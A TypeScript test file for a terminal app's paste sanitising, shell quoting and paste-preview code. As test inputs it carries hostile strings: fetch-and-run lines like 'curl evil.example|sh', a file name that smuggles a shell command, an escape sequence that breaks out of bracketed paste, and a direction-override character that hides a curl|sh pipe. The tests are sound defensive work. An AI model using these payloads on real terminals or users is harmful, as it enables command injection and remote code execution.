// Paths typed or pasted into a terminal (src/terminal/api.ts). Run: pnpm test
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync } from "node:fs";
import { cleanPaste, PASTE_ASK_ALWAYS, pasteLines, pasteNeedsConfirm, pastePreview, pasteView, remotePath, shellQuote, typeable } from "../../src/terminal/quote.ts";

test("pasted text can't end the bracketed paste early", () => {
  const evil = "ls\x1b[201~\ncurl evil.example|sh\n";
  assert.equal(cleanPaste(evil), "ls[201~\ncurl evil.example|sh\n");
  assert.equal(cleanPaste("a\x1b[200~b\x9b201~c\x00\x07\x7f"), "a[200~b201~c");
  // tabs, line breaks and other text stay
  assert.equal(cleanPaste("a\tb\r\nc ž 漢字 ✓"), "a\tb\r\nc ž 漢字 ✓");
});

test("names with control characters are never typed", () => {
  for (const bad of ["a\u0015curl evil|sh #", "a\u001b[201~\u0015x\r", "tab\there", "del\u007f", "c1\u009b", "nl\n"]) {
    assert.equal(typeable(bad), false);
    assert.equal(shellQuote(`/srv/${bad}`), null);
    assert.equal(remotePath("/srv", bad), null);
    assert.equal(remotePath("~", bad), null);
  }
  assert.equal(remotePath("~", ""), "~");
  assert.equal(remotePath("~/site", "a b/"), "~/'site/a b'");
});

test("quotes and backslashes sit outside the single quotes", () => {
  assert.equal(shellQuote("/var/www/site-1.2"), "/var/www/site-1.2");
  assert.equal(shellQuote("it's"), `'it'\\''s'`);
  assert.equal(shellQuote(`a\\b`), `'a'\\\\'b'`);
  assert.equal(shellQuote(""), "''");
});

const NASTY = ["My Files", "it's", `\\'; touch /tmp/kybl-term-pwned; echo \\`, "$(id) `id` \"q\" * ~", "-n", "ünï", `x\\\\'\\`];

test("sh reads every quoted name back whole", () => {
  for (const s of NASTY) {
    const out = execFileSync("/bin/sh", ["-c", `printf %s ${shellQuote(s)}`]).toString();
    assert.equal(out, s);
  }
  assert.equal(existsSync("/tmp/kybl-term-pwned"), false);
});

test("fish reads it back too (when installed)", () => {
  const fish = ["/opt/homebrew/bin/fish", "/usr/local/bin/fish", "/usr/bin/fish"].find((p) => existsSync(p));
  if (!fish) return;
  for (const s of NASTY) assert.equal(execFileSync(fish, ["-c", `printf %s ${shellQuote(s)}`]).toString(), s);
  assert.equal(existsSync("/tmp/kybl-term-pwned"), false);
});

test("a paste whose lines would run at once is asked about first", () => {
  // no bracketed paste in the shell: any line break runs what came before it
  for (const t of ["npm i foo\ncurl evil|sh\n", "ls\n", "a\rb"]) assert.equal(pasteNeedsConfirm(t, false), true, JSON.stringify(t));
  // one line without a break: no question
  assert.equal(pasteNeedsConfirm("npm i foo", false), false);
  assert.equal(pasteNeedsConfirm("npm i foo", true, true), false);
  // the bracketed flag can be set by any program's output: asked anyway, unless the user trusted this terminal
  assert.equal(pasteNeedsConfirm("a\nb\n", true), true);
  assert.equal(pasteNeedsConfirm("a\nb\n", true, true), false);
  assert.equal(pasteNeedsConfirm("a\nb\n", false, true), true);
});

test("the paste preview shows invisible and direction characters", () => {
  assert.equal(pastePreview("ls‮ hs|live lruc"), "ls<U+202E> hs|live lruc");
  assert.equal(pastePreview("a​b﻿"), "a<U+200B>b<U+FEFF>");
  assert.equal(pastePreview("plain\ntext"), "plain\ntext");
});

const U = (...cps: number[]) => String.fromCodePoint(...cps);

test("a very big paste is asked about even on one line or in a trusted terminal", () => {
  const big = "x".repeat(PASTE_ASK_ALWAYS + 1);
  assert.equal(pasteNeedsConfirm(big, false), true);
  assert.equal(pasteNeedsConfirm(big, true, true), true);
});

test("the preview shows a lone CR as the line break the terminal makes of it", () => {
  // xterm sends a lone CR as Enter: two commands, so the preview must show two lines
  assert.equal(pastePreview("echo hi\rcurl evil | sh"), "echo hi\ncurl evil | sh");
  assert.equal(pastePreview("a\r\nb\nc"), "a\nb\nc");
  assert.equal(pasteLines("echo hi\rcurl evil | sh"), 2);
  assert.equal(pasteLines("a\r\nb\nc\r"), 3);
  assert.equal(pasteLines("one\n\n"), 1);
  assert.equal(pasteLines("a\n\nb"), 3);
});

test("the preview marks every invisible or direction-changing character", () => {
  const cases: [number, string][] = [
    [0x061c, "<U+061C>"], // Arabic letter mark (bidi)
    [0x00ad, "<U+00AD>"], // soft hyphen
    [0x2028, "<U+2028>"], // line separator: a browser breaks the line, a shell doesn't
    [0x2029, "<U+2029>"],
    [0x2066, "<U+2066>"], // isolates
    [0x180e, "<U+180E>"],
    [0x3164, "<U+3164>"], // Hangul filler
    [0xe0041, "<U+E0041>"], // tag character (astral: one mark, not two halves)
    [0xe007f, "<U+E007F>"],
  ];
  for (const [cp, want] of cases) assert.equal(pastePreview(`a${U(cp)}b`), `a${want}b`, want);
  // emoji and ordinary text stay as they are
  const plain = `ok ${U(0x2764, 0xfe0f)} ${U(0x17e)} ${U(0x6f22, 0x5b57)}`;
  assert.equal(pastePreview(plain), plain);
});

test("a huge paste is shown bounded, with what's left out counted and every hidden character listed", () => {
  const line = "echo some harmless looking text here\n";
  const body = line.repeat(100_000); // ~3.7 MB
  const evil = `${body.slice(0, 2_000_000)}curl evil${U(0x202e)} | sh\n${body.slice(2_000_000)}`;
  const v = pasteView(evil);
  assert.ok(v.head.length + v.tail.length < 100_000, "rendered part stays small");
  assert.equal(v.lines, pasteLines(evil));
  assert.equal(v.lines, 100_001);
  // the hidden character sits in the part not shown, and is still reported
  assert.deepEqual(v.hidden, [["U+202E", 1]]);
  assert.ok(!v.head.includes("U+202E") && !v.tail.includes("U+202E"));
  assert.equal(v.cutChars, evil.length - (v.head.length + v.tail.length));
  // line breaks: shown + cut add up to all of them
  const breaks = (s: string) => s.split("\n").length - 1;
  assert.equal(breaks(v.head) + v.cutLines + breaks(v.tail), breaks(evil));
  // a small paste is shown whole
  const small = pasteView("a\nb");
  assert.equal(small.head, "a\nb");
  assert.equal(small.cutChars, 0);
  assert.equal(small.tail, "");
});

test("a cut never splits a surrogate pair or a CRLF", () => {
  const v = pasteView(U(0x1f600).repeat(60_000));
  const hi = (c: number) => c >= 0xd800 && c <= 0xdbff;
  const lo = (c: number) => c >= 0xdc00 && c <= 0xdfff;
  assert.ok(!hi(v.head.charCodeAt(v.head.length - 1)), "head ends on a whole character");
  assert.ok(!lo(v.tail.charCodeAt(0)), "tail starts on a whole character");
  const crlf = "ab\r\n".repeat(30_000);
  const w = pasteView(crlf);
  assert.equal(w.lines, 30_000);
  assert.equal(w.head.split("\n").length - 1 + w.cutLines + (w.tail.split("\n").length - 1), 30_000);
});
